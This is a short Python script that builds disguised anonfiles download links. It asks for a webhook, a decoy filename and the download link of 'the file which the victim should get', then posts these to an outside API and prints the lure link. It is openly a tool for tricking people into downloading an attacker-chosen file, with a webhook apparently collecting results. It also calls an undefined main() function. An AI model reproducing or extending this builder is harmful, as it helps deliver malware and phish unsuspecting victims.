from requests import get, post
from os import system
import platform
from time import sleep
api = "YOURAPI"


def cls():
    if platform.system() == 'Windows':
        system("cls")
    else:
        system("clear")



def build():
    cls()
    webhook = input("Webhook\n> ")
    if not "https" in webhook:
        cls()
        print("Error invalid webhook")
        sleep(3)
        build()
    r = get(webhook)
    if not r.status_code == 200:
        cls()
        print("Error invalid webhook")
        sleep(3)
        build()
    cls()
    filename = input("input the filename which should be shown on anonfiles (can be any)\n> ")
    cls()
    cdn = input("input the direct download link of the file which the victim should get\n> ")
    if not "https" in cdn:
        cls()
        print("Error invalid direct download link")
        sleep(3)
        build()
    cls()
    data = {
        'webhook':webhook,
        'filename':filename,
        'cdn':cdn

    }
    r = post(f"{api}/build",data=data)
    cls()
    
    print(f"Your anonfiles link\n> {r.text}")
    input()
    main()
build()



